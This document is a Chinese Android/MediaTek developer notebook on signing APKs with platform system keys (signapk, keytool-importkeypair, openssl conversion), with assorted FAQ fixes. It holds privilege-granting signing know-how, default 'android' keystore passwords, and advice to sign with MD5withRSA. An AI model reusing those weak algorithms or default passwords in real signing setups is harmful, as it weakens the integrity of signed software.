在项目开发时，如果需要使应用具有系统权限，例如可以支持静默安装和卸载APK，此时就需要使用系统签名。
常用的系统签名方式包括在ubuntu环境下、手动签名和在AndroidStudio环境配置，三种方式中，实现最简单的是通过AndroidStudo方式，该方式的签名实现与正常的APK签名相同，唯一不同的就是签名文件是通过系统生成的。
注意，无论采用何种签名方式，如果想实现具有系统权限的应用，在APK生成时，都需要在AndroidManifest.xml中配置android:sharedUserId=“android.uid.system”，如下所示

<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.xxxx.xxxx"
    android:sharedUserId="android.uid.system">
</manifest>

1. ubuntu环境编译
该方式需要在安卓源码编译的环境下，在将APK打包至安卓系统升级包时，需要配置Android.mk文件，通过在配置LOCAL_CERTIFICATE 参数时，将其设置为PRESIGNED，如果需要改APK具有系统权限，使用系统签名，则需要设置为platform

LOCAL_CERTIFICATE := platform 或 shared 或 media

在设置好 Android.mk 文件后，在ubuntu环境下执行系统的编译流程。
如果之前在ubuntu环境下已经执行好了系统的编译流程，则可以直接cd到系统的package/apps目录下，进入到需要编译的APK文件目录下执行mm指令，或在其他目录执行mmm /package/apps/APK所在的文件夹名称。

2.手动签名
手动系统签名与Android的APK重签名不同，重签名是之前APK已经签名完成，在实际使用时，需要更改签名文件，例如一些特殊的算法处理对于系统的包名和签名都有绑定操作，如更换则无法使用。
手动系统签名是对于通过AndroidStudio的build生成的无签名的APK文件，进行手动系统签名操作。具体执行过程如下。

2.1 下载SignApk.jar
首先下载SignApk.jar包，如下图所示
如果本地有安卓系统的源码，可以直接在本地的build\tools\signapk目录下查找到该jar包。

2.2 查找security文件
拿到系统定制厂商提供的security文件，不同编译下生成的security文件内容不同，需针对该安卓系统下的编译生成的security文件，因此这也限定了该系统签名后的应用只能在该系统下运行，在其他系统下运行就不具有系统权限。
在security文件中找到media.pk8和platform.x509.pem两个文件。

2.3 执行系统签名操作
将2.1中的SignApk.jar和2.2中的media.pk8和platform.x509.pem文件一起复制到包含需要签名的APK文件夹中，然后执行如下语句

java -jar signapk.jar  platform.x509.pem platform.pk8　old.apk new.apk

生成的new.apk文件就是系统签名后APK文件。
该方式的操作，可参考安卓签名工具SignApk.jar使用教程，其已将签名的流程制作成Window下的.exe工具，只需一次配置，每次点击更换需要签名的文件即可。

3 AndroidStudio方式
通常对于APK的签名文件是通过AndroidStudio的New Key Store方式自定义实现，但是如果需要使用系统签名文件需要结合security文件中的media.pk8和platform.x509.pem两个文件，通过keytool-importkeypair实现，下载成功后，将media.pk8和platform.x509.pem两个文件放置在包含 keytool-importkeypair目前下，执行以下语句。

./keytool-importkeypair -k ./platform.keystore -p android -pk8 platform.pk8 -cert platform.x509.pem -alias platform

需要注意的是：

该语句的执行是在 ubuntu 环境下执行的
platform.keystore 为系统签名文件
android 为签名密码
platform 为签名的别名(alias)
生成系统签名后，在 AndroidStudio 中配置 Signing 签名信息，配置成功后在 module 的 buid.gradle 中可以查看如下配置信息。

signingConfigs {
    releaseConfig {
        keyAlias 'platform'
        keyPassword 'android'
        storeFile file('.........platform.keystore')//签名文件路径
        storePassword 'android'
    }
}
4.总结
从以上的分析中可以看出，无论三种那种方式的实现，都离不开系统源码中的security目录下的media.pk8和platform.x509.pem两个文件，该两个文件是保证应用具有系统签名的前提，如果使用其他系统的文件，则在该系统中，无法具有系统权限。
对比以上方法，分为具有ubuntu和没有两种环境下。

具有ubuntu的编译环境：则使用第一种比较简单，第三种生成的系统签名文件，可用于其他APK的签名使用，在AndroidStudio中配置后，方便调试使用，不必每次都执行命令行来生成签名后的APK文件。
不具有ubuntu的编译环境：该方式只能通过第二种方式实现，且每次调试使用时都需要替换APK生成新的系统签名后的APK，操作比较繁琐。当然在2.3中也提到，可借助其他同学制作的小工具方便签名文件的使用。
```

## Android R

```text
./apksigner sign --ks debug.keystore game.apk
```

## pk8和x509.pem转换成keystore

```text
转自：http://www.cnblogs.com/platte/p/3511814.html

一 在github上下载工具

https://github.com/getfatday/keytool-importkeypair
二 将工具在Linux环境下解压或者解压后Copy到Linux下，运行如下命令
keytool-importkeypair -k ~/android/debug.keystore -p android -pk8 ~/android/platform.pk8 -cert ~/android/platform.x509.pem -alias anyname

 
其中 -k:表示要生成的Eclipse下的签名的keystore的名字，包括路径名，这里存到主目录的android目录下，名字为debug.keystore。你可以随便取名
-p 表示新生成的keystore的密码是什么，这里为android
-pk8 表示要导入的pk8文件的名称，可以包括路径，这里是主目录的Android目录下，我们的pk8文件和pem文件都在这个目录下
-cert 表示要导入的证书文件,和pk8文件在同一个目录
-alias 表示给生成的debug.keystore取一个别名，这个名字只有我们在签名的时候才用的到，生成在文件名是debug.keystore。这个名字，随便取
 
另外一种方法：
转自：http://www.360doc.com/content/11/0823/09/87000_142587003.shtml
1 把pk8转换成pk12格式

openssl pkcs8 -in shared.pk8 -inform DER -outform PEM -out shared.priv.pem -nocrypt

2 生成pk12的密钥问文件

openssl pkcs12 -export -in shared.x509.pem -inkey shared.priv.pem -out shared.pk12 -name androiddebugkey

3 生成keystore

keytool -importkeystore -deststorepass android -destkeypass android -destkeystore debug.keystore -srckeystore shared.pk12 -srcstoretype PKCS12 -srcstorepass android -alias androiddebugkey
```

## [签名] EmmcTest_v1.2_mu.apk 在 drv_only 上无法安装，报错 INSTALL_FAILED_SHARED_USER_INCOMPATIBLE

```text
用 apktool d EmmcTest_v1.2_mu.apk 发现这个 apk 用了 android:sharedUserId="android.uid.system"，需要 platform 的签名

找到 drv_only 分支上的 build/target/product/security/platform.x509.pem 和 platform.pk8 并下载下来

随便找一个编译过的工程找到 out/host/linux-x86/framework/signapk.jar

然后用 java -jar signapk.jar platform.x509.pem platform.pk8 EmmcTest_v1.2_mu.apk EmmcTest_v1.2_mu_signed.apk 去签名

发现报错信息如下

Exception in thread "main" java.lang.UnsatisfiedLinkError: org.conscrypt.NativeCrypto.get_cipher_names(Ljava/lang/String;)[Ljava/lang/String;
 at org.conscrypt.NativeCrypto.get_cipher_names(Native Method)
 at org.conscrypt.NativeCrypto.<clinit>(NativeCrypto.java:764)
 at org.conscrypt.OpenSSLProvider.<init>(OpenSSLProvider.java:56)
 at org.conscrypt.OpenSSLProvider.<init>(OpenSSLProvider.java:49)
 at com.android.signapk.SignApk.main(SignApk.java:942)

百度之后发现要用如下的签名命令才可以签名成功
java -Djava.library.path=out/host/linux-x86/lib64 -jar signapk.jar platform.x509.pem platform.pk8 EmmcTest_v1.2_mu.apk EmmcTest_v1.2_mu_signed.apk

问题来了：为什么 dev 分支上的软件不需要给 apk 签名也可以成功安装呢?

因为通过 keytool 查看了 EmmcTest_v1.2_mu.apk 的签名发现这个 apk 已经经过签名了，apk 的签名和系统签名不一致，所以无法安装

签名之后安装失败，报错：INSTALL_PARSE_FAILED_NO_CERTIFICATES
jdk1.7以上的签名工具需要timestamp的原因，你用的是java1.8吧，你必须要在签名的命令后面加上 -digestalg SHA1 -sigalg MD5withRSA

Android R上签名遇到的问题
1.signapk.jar 默认没有生成？
用 pathmod signapk 查看到 signapk 的源码路径如下 build/make/tools/signapk
用 ninja 或 mm 编译生成 signapk.jar 文件: ./prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-sp7731e_1h10_native.ninja signapk 2>&1 | tee signapk.log

2.生成之后用如下命令签名失败？
java -Djava.library.path=out/host/linux-x86/lib64 -jar out/soong/host/linux-x86/framework/signapk.jar build/make/target/product/security/release/platform.x509.pem build/make/target/product/security/release/platform.pk8 EmmcTest_v1.2_mu_unsigned.apk EmmcTest_v1.2_mu_signed.apk
报错信息如下:
Error: A JNI error has occurred, please check your installation and try again
Exception in thread "main" java.lang.UnsupportedClassVersionError: com/android/signapk/SignApk has been compiled by a more recent version of the Java Runtime (class file version 53.0), this version of the Java Runtime only recognizes class file versions up to 52.0
 at java.lang.ClassLoader.defineClass1(Native Method)
 at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
 at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
 at java.net.URLClassLoader.defineClass(URLClassLoader.java:468)
 at java.net.URLClassLoader.access$100(URLClassLoader.java:74)
 at java.net.URLClassLoader$1.run(URLClassLoader.java:369)
 at java.net.URLClassLoader$1.run(URLClassLoader.java:363)
 at java.security.AccessController.doPrivileged(Native Method)
 at java.net.URLClassLoader.findClass(URLClassLoader.java:362)
 at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
 at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:352)
 at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
 at sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:495)
意思是java的运行时版本和java编译版本不匹配
原因是打开了一个新的终端去签名，导致java版本异常，可以使用编译过代码的终端去签名
也可以使用对应版本的java去签名
prebuilts/jdk/jdk9/linux-x86/bin/java -Djava.library.path=out/host/linux-x86/lib64 -jar out/soong/host/linux-x86/framework/signapk.jar build/make/target/product/security/release/platform.x509.pem build/make/target/product/security/release/platform.pk8 EmmcTest_v1.2_mu_sign.apk EmmcTest_v1.2_mu_sign_sss.apk
```

## [CMD]  [签名] 如何查看 apk 签名???

```text
1.解压 apk
2.keytool -printcert -file META-INF/CERT.RSA

Owner: EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US
Issuer: EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US
Serial number: b3998086d056cffa
Valid from: Wed Apr 16 06:40:50 CST 2008 until: Sun Sep 02 06:40:50 CST 2035
Certificate fingerprints:
  SHA1: 27:19:6E:38:6B:87:5E:76:AD:F7:00:E7:EA:84:E4:C6:EE:E3:3D:FA
  SHA256: C8:A2:E9:BC:CF:59:7C:2F:B6:DC:66:BE:E2:93:FC:13:F2:FC:47:EC:77:BC:6B:2B:0D:52:C1:1F:51:19:2A:B8
Signature algorithm name: MD5withRSA (weak)
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3

Extensions: 

#1: ObjectId: 2.5.29.35 Criticality=false
AuthorityKeyIdentifier [
KeyIdentifier [
0000: 4F E4 A0 B3 DD 9C BA 29   F7 1D 72 87 C4 E7 C3 8F  O......)..r.....
0010: 20 86 C2 99                                         ...
] 
[EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US] 
SerialNumber: [    b3998086 d056cffa] 
] 

#2: ObjectId: 2.5.29.19 Criticality=false
BasicConstraints:[
  CA:true
  PathLen:2147483647
] 

#3: ObjectId: 2.5.29.14 Criticality=false
SubjectKeyIdentifier [
KeyIdentifier [
0000: 4F E4 A0 B3 DD 9C BA 29   F7 1D 72 87 C4 E7 C3 8F  O......)..r.....
0010: 20 86 C2 99                                         ...
] 
] 

Warning:
The certificate uses the MD5withRSA signature algorithm which is considered a security risk.
```

## [CMD]  [签名] 查看 keystore

```text
keytool -list -keystore debug.keystore
keytool -v -list -keystore ***.keystore
```

## [签名] openssl生成.keystore 签名

```text
将 platform.pk8 和 platform.x509.pem 格式的系统签名转换为 mykey.keystore 格式
需要系统中有openssl 和 jdk，windows 版openssl 可以在http://slproweb.com/products/Win32OpenSSL.html下载

openssl pkcs8 -inform DER -nocrypt -in platform.pk8 -out key.pem
openssl pkcs12 -export -in platform.x509.pem -inkey key.pem -out platform.p12 -password pass:test -name mykey
keytool -importkeystore -deststorepass password -destkeystore mykey.keystore -srckeystore platform.p12 -srcstoretype  PKCS12 -srcstorepass test
keytool -list -v -keystore mykey.keystore

第一步使用platform.pk8生成了key.pem 文件
第二步使用platform.x509.pem 和key.pem 生成了platform.p12 文件，其中签名的名字是mykey，密码是test
第三步使用platform.p12 生成了mykey.keystore 文件，keystore密码是password
第四步，不明
----------------------------------
以下步骤在cygwin下操作

1、生成shared.priv.pem 
openssl pkcs8 -in platform.pk8 -inform DER -outform PEM -out shared.priv.pem -nocrypt

2、生成pkcs12 
openssl pkcs12 -export -in platform.x509.pem -inkey shared.priv.pem -out shared.pk12 -name androidreleasekey

3、生成release.keystore

keytool -importkeystore -deststorepass android -destkeypass android -destkeystore release.keystore -srckeystore shared.pk12 -srcstoretype pkcs12 -srcstorepass android -alias androidreleasekey

--------------------------------------------------------------
Warning:
<androidreleasekey> 使用的 MD5withRSA 签名算法存在安全风险。
JKS 密钥库使用专用格式。建议使用 "keytool -importkeystore -srckeystore release.keystore -destkeystore release.
keystore -deststoretype pkcs12" 迁移到行业标准格式 PKCS12。

keytool -importkeystore -srckeystore release.keystore -destkeystore release.keystore -deststoretype pkcs12

openssl pkcs12 -export -in platform.x509.pem -inkey key.pem -out platform.p12 -name mykey 
```

## [CMD]  [签名] apk打包时的系统签名

```text
https://github.com/getfatday/keytool-importkeypair

./keytool-importkeypair -k ./tg.jks -p myPassword -pk8 platform.pk8 -cert platform.x509.pem -alias myAlias
```

## [签名] 这几个证书的作用

```text
testkey
Generic default key for packages that do not otherwise specify a key.

platform
Test key for packages that are part of the core platform.

shared
Test key for things that are shared in the home/contacts process.

media
Test key for packages that are part of the media/download system.

verity
Test Key for verifiedboot system imagein Android Lollipop. Sign boot.img,sign verity metadata in system.img.
```

## TODO : [签名] jks 类型的签名和普通类型的签名的有什么区别????

## [签名] jarsigner 和 signapk 工具和对应的签名文件.pem和.pk8+keystore

```text
jarsigner 是Java本生自带的一个工具，他可以对jar进行签名，使用的文件是keystore。
jarsigner -verbose -keystore [keystorePath]  -signedjar [apkOut]  [apkIn]  [alias] 
jarsigner命令格式：-verbose输出详细信息 -keystore密钥库位置 -signedjar要生成的文件 要签名的文件 密钥库文件
keystorePath--参数代表keyStore的绝对路径，如D:\keystore
apkOut--参数代表签名后的apk路径，如D:\signed.apk
apkin--参数代表在腾讯应用中心下载的未签名apk，默认名称为tap_unsign.apk
alias--参数代表签名用的alias名称（创建keyStore时所填写），如timdong

jarsigner -verbose -keystore debug.keystore -signedjar test2.apk tap_unsign1.apk timdong


signapk是后面专门为了Android应用程序apk进行签名的工具，他们两的签名算法没什么区别，主要是签名时使用的文件不一样，使用的签名文件是 pk8 + pem
*.pem 文件
在android对apk签名的时候，.pem这种文件就是一个X.509的数字证书，里面有用户的公钥等信息，是用来解密的。这种文件格式里面不仅可以存储数字证书，还能存各种key。
在 ubuntu 系统上直接双击就能打开查看里面的信息，这个是明文保存的。

*.x509.pk8 文件
上文没有提过以.pk8为扩展名的文件，应该和PKCS #8是对应的，用来保存private key。

那么keystore文件和pk8,x509.pem他们之间是不是有什么联系呢?答案是肯定的，网上搜了一下，果然他们之间是可以转化的，这里就不在分析如何进行转化的，网上的例子貌似很多，有专门的的工具可以进行转化。

keystore文件和pk8，x509.pem文件的区别

jarsigner签名时用的是keystore文件，signapk签名时用的是pk8和x509.pem文件，都是用来给apk进行签名的。

到这里我们就知道CERT.SF文件做了什么：

1》计算这个MANIFEST.MF文件的整体SHA1值，再经过BASE64编码后，记录在CERT.SF主属性块（在文件头上）的“SHA1-Digest-Manifest”属性值值下
2》逐条计算MANIFEST.MF文件中每一个块的SHA1，并经过BASE64编码后，记录在CERT.SF中的同名块中，属性的名字是“SHA1-Digest

最后我们在来看一下CERT.RSA文件，这里我们看到的都是二进制文件，因为RSA文件加密了，所以我们需要用openssl命令才能查看其内容

openssl pkcs7 -inform DER -in CERT.RSA -noout -print_certs -text

1、数据指纹，签名文件，证书文件的含义
1》数据指纹就是对一个数据源做SHA/MD5算法，这个值是唯一的
2》签名文件技术就是：数据指纹+RSA算法
3》证书文件中包含了公钥信息和其他信息
4》在Android签名之后，其中SF就是签名文件，RSA就是证书文件我们可以使用openssl来查看RSA文件中的证书信息和公钥信息

2、我们了解了Android中的签名有两种方式：jarsigner和signapk 这两种方式的区别是：
1》jarsigner签名时，需要的是keystore文件，而signapk签名的时候是pk8,x509.pem文件
2》jarsigner签名之后的SF和RSA文件名默认是keystore的别名，而signapk签名之后文件名是固定的:CERT
3》Eclipse中我们在跑Debug程序的时候，默认用的是jarsigner方式签名的，用的也是系统默认的debug.keystore签名文件
4》keystore文件和pk8,x509.pem文件之间可以互相转化

[FAQ13817]  [签名] 如何在L上use release key?
```

## [签名] 获取apk的签名信息

```text
public void getAPKSign(View view) {
 Signature[]   signatures;
 if (Build.VERSION.SDK_INT >= 21) {
  signatures=showUninstallAPKSignaturesAfter21("/mnt/sdcard/qqemail.apk");   
 } else {
  signatures=showUninstallAPKSignatures("/mnt/sdcard/qqemail.apk");
 }
 parseSignature(signatures[0] .toByteArray());
 getSingInfo("com.android.phone");
}

//反射调用android.content.pm.PackageParser的时候注意：android 4.4以下是有参构造 android5.0以上是无参构造函数了。
//下面是android5.0以上的解决方法
public Signature[]  showUninstallAPKSignaturesAfter21(String apkPath) {
 String PATH_PackageParser = "android.content.pm.PackageParser";
 try {
  // PackageParser packageParser = new PackageParser();
  
  Class pkgParserCls = Class.forName(PATH_PackageParser);
  Constructor pkgParserCt = pkgParserCls.getConstructor( new Class[] {});   
  Object pkgParser = pkgParserCt.newInstance(new Object[] {});
  Log.i(TAG, "pkgParser:" + pkgParser.toString());
  // 这个是与显示有关的, 里面涉及到一些像素显示等等, 我们使用默认的情况
  DisplayMetrics metrics = new DisplayMetrics();
  metrics.setToDefaults();
  //方法原型： public Package parsePackage(File packageFile, int flags) throws PackageParserException 
  
  Method pkgParser_parsePackageMtd = pkgParserCls.getDeclaredMethod(
    "parsePackage",  new Class[] {File.class,int.class});
  
  Object pkgParserPkg = pkgParser_parsePackageMtd.invoke(pkgParser,
    new Object[] {new File(apkPath),PackageManager.GET_SIGNATURES});

  Method pkgParser_collectCertificatesMtd = pkgParserCls
    .getDeclaredMethod("collectCertificates", new Class[] { pkgParserPkg.getClass(),Integer.TYPE});
    
  pkgParser_collectCertificatesMtd.invoke(pkgParser, new Object[] {pkgParserPkg,PackageManager.GET_SIGNATURES});
  // 应用程序信息包, 这个公开的, 不过有些函数, 变量没公开
  Field packageInfoFld = pkgParserPkg.getClass().getDeclaredField("mSignatures");
  Signature[]  info = (Signature[] ) packageInfoFld.get(pkgParserPkg);

  Log.i(TAG, info[0] .toCharsString());
  return info;
 } catch (Exception e) {
  e.printStackTrace();
 }
 return null;
}
//反射调用android.content.pm.PackageParser的时候注意：android 4.4以下是有参构造 android5.0以上是无参构造函数了。
//下面是android5.0以下的解决方法
public Signature[]  showUninstallAPKSignatures(String apkPath) {
 String PATH_PackageParser = "android.content.pm.PackageParser";
 try {
  // apk包的文件路径
  // 这是一个Package 解释器, 是隐藏的
  // 构造函数的参数只有一个, apk文件的路径
  // PackageParser packageParser = new PackageParser(apkPath);
  Class pkgParserCls = Class.forName(PATH_PackageParser);
  Constructor pkgParserCt = pkgParserCls.getConstructor( new Class[] {String.class});
  
  Object pkgParser = pkgParserCt.newInstance(new Object[] {apkPath});
  Log.i(TAG, "pkgParser:" + pkgParser.toString());
  // 这个是与显示有关的, 里面涉及到一些像素显示等等, 我们使用默认的情况
  DisplayMetrics metrics = new DisplayMetrics();
  metrics.setToDefaults();
  
  //PackageParser.Package mPkgInfo = public Package parsePackage(File sourceFile, String destCodePath,DisplayMetrics metrics, int flags) 

  Method pkgParser_parsePackageMtd = pkgParserCls.getDeclaredMethod(
    "parsePackage",  new Class[] {File.class, String.class,DisplayMetrics.class,Integer.TYPE});
  
  Object pkgParserPkg = pkgParser_parsePackageMtd.invoke(pkgParser,
    new Object[] {new File(apkPath), apkPath,metrics,PackageManager.GET_SIGNATURES});

  Method pkgParser_collectCertificatesMtd = pkgParserCls
    .getDeclaredMethod("collectCertificates", new Class[] { pkgParserPkg.getClass(),Integer.TYPE});
    
  pkgParser_collectCertificatesMtd.invoke(pkgParser, new Object[] {pkgParserPkg,PackageManager.GET_SIGNATURES});
  // 应用程序信息包, 这个公开的, 不过有些函数, 变量没公开
  Field packageInfoFld = pkgParserPkg.getClass().getDeclaredField("mSignatures");
  Signature[]  info = (Signature[] ) packageInfoFld.get(pkgParserPkg);

  Log.i(TAG, info[0] .toCharsString());
  return info;
 } catch (Exception e) {
  e.printStackTrace();
 }
 return null;
}

private String getSign(Context context) {
 PackageManager pm = context.getPackageManager();
 List<PackageInfo> apps = pm.getInstalledPackages(PackageManager.GET_SIGNATURES);
 Iterator<PackageInfo> iter = apps.iterator();
 while (iter.hasNext()) {
  PackageInfo packageinfo = iter.next();
  String packageName = packageinfo.packageName;
  if (packageName.equals(context.getPackageName())) {
   Log.i(TAG, packageinfo.signatures[0] .toCharsString());
   return packageinfo.signatures[0] .toCharsString();
  }
 }
 return null;
}

public void getSingInfo(String pkgName) {
 try {
  PackageInfo packageInfo = getPackageManager().getPackageInfo(pkgName, PackageManager.GET_SIGNATURES);
  Signature[]  signs = packageInfo.signatures;
  Signature sign = signs[0] ;
  parseSignature(sign.toByteArray());
 } catch (Exception e) {
  e.printStackTrace();
 }
}
public void parseSignature(byte[]  signature) {
 try {
  CertificateFactory certFactory = CertificateFactory.getInstance("X.509");
  X509Certificate cert = (X509Certificate) certFactory.generateCertificate(new ByteArrayInputStream(signature));
  String pubKey = cert.getPublicKey().toString();
  String signNumber = cert.getSerialNumber().toString();
  System.out.println("signName:" + cert.getSigAlgName());
  System.out.println("pubKey:" + pubKey);
  System.out.println("signNumber:" + signNumber);
  System.out.println("subjectDN:"+cert.getSubjectDN().toString());
 } catch (CertificateException e) {
  e.printStackTrace();
 }
}
```

## [Snippet]  [签名] 获取当前app的签名信息

```text Java
/**
 * get signature of current package
 * @param context
 * @return signature, null if there is no signature
 */
public static String getSignature(Context context){
    Log.i(TAG, "SignatureUtils.getSignature");
    PackageManager pm = context.getPackageManager();
    String pkgName = context.getPackageName();
    try {
        PackageInfo pi = pm.getPackageInfo(pkgName, PackageManager.GET_SIGNATURES);
        Signature[]  signatures = pi.signatures;
        if(signatures != null && signatures.length > 0){
            String signature =  signatures[0] .toCharsString();
            Log.i(TAG, "Signature of current package is : " + signature);

            return  signature;
        }
    } catch (PackageManager.NameNotFoundException e1) {
        e1.printStackTrace();
    }
    return null;
}
```

## [Snippet]  [签名] 获取apk文件的签名信息

```text Java
/**
 * get signature of an apk file
 * this method will execute quit a long time, so it is suitable to call it in sub thread
 * @param context
 * @param apkFilePath
 * @return signature , null if there is no signature , or apkFilePath is wrong
 */
public static String getSignatureOfApk(Context context, String apkFilePath){
    if (TextUtils.isEmpty(apkFilePath)) {
        return null;
    }

    PackageManager pm = context.getPackageManager();
    PackageInfo pi = pm.getPackageArchiveInfo(apkFilePath, PackageManager.GET_SIGNATURES);
    Signature[]  signatures = pi.signatures;

    if(signatures != null && signatures.length > 0){
        String signature =  signatures[0] .toCharsString();
        Log.i(TAG, "Signature of " + apkFilePath + " is : " + signature);
        return  signature;
    }
    return null;
}
```

## [FAQ20246]  [EM] N版本User-Load工模中没有以往的功能项

```text
从M1.MP3 branch开始（包含N0 N1 branch），对于User Load，出于系统安全或功能必要性的考虑，有些测试功能在工模UI上已移除入口。如确实有需要，可以按照SOLUTION的流程打开。
以打开User Load工模中Hardware Testing页面的Power项为例：

1.根据工模UI上显示的英文字符串，在以下文件中找到对应的name.
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/values/strings.xml
例如： <string name="power">Power</string>

2.根据1中找到的name，在以下文件找到对应Preference的key.
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/xml/telephony.xml
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/xml/connectivity.xml
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/xml/hardware_testing.xml
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/xml/location.xml
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/xml/log_and_debugging.xml
/vendor/mediatek/proprietary/packages/apps/EngineerMode/res/xml/others.xml
例如：Hardware Testing页面对应hardware_testing.xml文件，在该文件可以找到：
<Preference android:key="power" android:title="@string/power"

3.根据2的key，在以下文件的 removeUnsupportedItems()函数的if ( FeatureSupport.isUserLoad())代码块中，注释对应的removePreference即可.
/vendor/mediatek/proprietary/packages/apps/EngineerMode/src/com/mediatek/engineermode/PrefsFragment.java
例如：removePreference(screen, "power"); 改成 //removePreference(screen, "power");

PS:更加快捷的做法是，由于Preference的key值一般和工模UI显示的字串相像，于是一般可以跳到第三步直接注释代码。
但是按照1.2.3步走下来必不会出错。
```

## [ota]  [FAQ20255]  [Recovery]  [Android N1] Recovery mode不进行任何操作，无法pull cache/recovery/last_log

```text
遇到以下场景：

1、按键进入recovery mode；不做任何操作。
2、adb reboot recovery；不做任何操作。
3、其他显示调用reboot recovery mode，但没有实质性的操作需求。

如果再次reboot 到normal mode，执行如下操作会报错：

adb shell pull cache/recovery/last_log
/system/bin/sh: pull: not found

/cache/recovery # ls -al
total 32
drwxrwx--- 2 system cache 4096 2010-01-04 03:44 .
drwxrwx--- 7 system cache 4096 2010-01-01 00:04 ..
-rw------- 1 root root 5 2010-01-04 03:47 last_locale
No last_log
[SOLUTION] 
这是Google原生的做法，如果比较介意，可以通过修改如下code:
/bootable/recovery/recovery.cpp
bool modified_flash = false; // 改成 true
```

## [debug]  [log]  [FAQ20213]  how to find which progress switch on/off the wifi

```text
Many times ,we will meet this problem ,the wifi was disabled or enabled  without the user switch the switcher ;
so next ,i will introduce the way which will be used to  find the  real "operator"?
from log ,
main_log ,search the key log :setwifistate
Line 25438: 04-25 14:35:26.382642 892 954 D WifiStateMachine: setWifiState: disabling
Line 26117: 04-25 14:35:26.793326 892 954 D WifiStateMachine: setWifiState: disabled
Line 26650: 04-25 14:35:29.152201 892 954 D WifiStateMachine: setWifiState: enabling
Line 26854: 04-25 14:35:29.432136 892 954 D WifiStateMachine: setWifiState: enabled
sys_log,search the key log :setwifienabled
Line 22510: 04-25 14:35:26.312304 892 906 D WifiService: setWifiEnabled: false pid=6102, uid=10081
Line 23459: 04-25 14:35:27.253092 892 1572 D WifiService: setWifiEnabled: true pid=6102, uid=10081
ok,next step is to find the pid = 6102 uid = 10081 maps who?

event_log ,search the key log :6102;
04-25 11:25:08.720815   892   907 I am_pss  : [6102,10081,com.cshare.transfer,132882432,109949952] 

it means is the app whose packect name is com.cshare.transfer turn on/off the wifi ;

ps:
a progress only has one UID ,but a UID maybe correspond to many progress ;
PID is the progress ID,every progress's pid is different;
TID is the thread ID ,a progress include many thread;

so if only want to find the progress ,we can use PID;
if we need find the TID ,we need conbine the PID with TID;
if we want to find the user group,we can use UID;
```

## [默认值]  [FAQ20189]  如何关闭手机防盗

```text
PPL（手机防盗）是我司为满足出货中国大陆的手机pass CTA安全等级能力测试开发的。
出货海外的项目不需要这个apk的，可以直接拿掉。

拿掉方法：
1. 关闭 MTK_PRIVACY_PROTECTION_LOCK
2. init.rc中拿掉ppl_agent的启动

service PPLAgent /vendor/bin/ppl_agent
    class main
    user root
    group system cache
```

## [log] N平台预置apk,无法打开

```text
aaltool apk 点击打开失败；打印类似log；

01-01 02:20:55.889 3100 3100 D DropBoxReport: java.lang.UnsatisfiedLinkError: dlopen failed: library "libaal.so" not found

且在/system/vendor/lib/以及/system/vendor/lib64/下都有libaal.so

[SOLUTION] 
Android N 之后, third party app 会被限定不能使用非AOSP library (ex: libaal)
需用 eng load, push license file暫時打開權限

1、build aaltool 时，build出来的libaaltool_jni.so push到手机/system/vendor/lib 和 /system/vendor/lib64 下；

2、新建public.libraries.txt，内容如下：
libc++.so
libaal.so
libaaltool_jni.so
libbinder.so
libutils.so
libdpframework.so
libandroid_runtime.so

3、push public.libraries.txt 到手机 /vendor/etc/ 目录，重启之后就可以正常使用；
adb push public.libraries.txt /vendor/etc/
```

## [monkey]  [FAQ20170]  MTBF或monkey test中ArrayList/CopyOnWriteArrayList发生ArrayIndexOutOfBoundsException如何解决?

```text
发生ArrayIndexOutOfBoundsException是直接使用了get()的原因。
CopyOnWriteArrayList是ArrayList的一个线程安全变体，但CopyOnWriteArrayList的写操作是安全的，而读操作是不安全的，很可能在其他线程中已经将某个index值读走或者删除了。

针对此问题的解法：
解法一：可将该问题反馈至google，请google帮忙修改此问题
解法二：使用迭代器来进行遍历来规避此问题

下面是推荐的修改方法：
// change begin
// NOTE: because of the use of CopyOnWriteArrayList, we *must* use an iterator to
// perform the dispatching. The iterator is a safe guard against listeners that
// could mutate the list by calling the various add/remove methods. This prevents
// the array from being modified while we iterate it.
[SOLUTION] 
private void handleScreenTurnedOn() {
    final int count = mCallbacks.size();
    for (int i = 0 ; i < count; i++) {
        KeyguardUpdateMonitorCallback cb = mCallback.get().get();
        if (cb != null) {
            cb.onScreenTurnedOn();
        }
    }
}

上面的用法可以改为如下用iterator遍历的方式

private void handleScreenTurnedOn() {
    if (mCallbacks != null && mCallbacks.size() > 0) {
        for (WeakReference<KeyguardUpdateMonitorCallback> cb : mCallbacks) {
            if (cb != null && cb.get() != null) {
                cb.get().onScreenTurnedOn();
            }
        }
    }
}

上面只是列举了一个Keyguard的例子，android整个代码范围还有很多这种case
因为这些都是google design，而且涉及到的面很广，所以不便于在代码里面一个一个这样的做修改。
目前采取的措施是：在遇到这种数组访问越界的地方，按照上述的修改思想做改动，平台代码这边不会release正式patch
```

## [monkey]  [FAQ20175]  MTBF或monkey test中发生java.lang.IllegalArgumentException: pointerIndex out of range如何解决?

```text
在test过程中，经常会碰到如下Java Exception：java.lang.IllegalArgumentException: pointerIndex out of range
这是因为在多点触控操作下，在获取底层的pointer index的时候发生了异常导致返回值为-1
详细log如下所示

这是google code没有考虑到获取到的index为非法值导致的JE，因此在java层做法是加上一个判断，避免发生JE

[SOLUTION] 
解法办法是：找到发生JE的文件，在处理touch event的地方，加上判断
```

## [默认值] 如何关闭SIM热插拔功能

```text
关闭SIM热插拔功能需在ap和modem端操作如下：
1. AP端：在 ProjectConfig.mk 中将 MTK_SIM_HOT_SWAP 设置为no即可.
2. modem端：makefile 中设置 SIM_HOT_SWAP = NONE
```
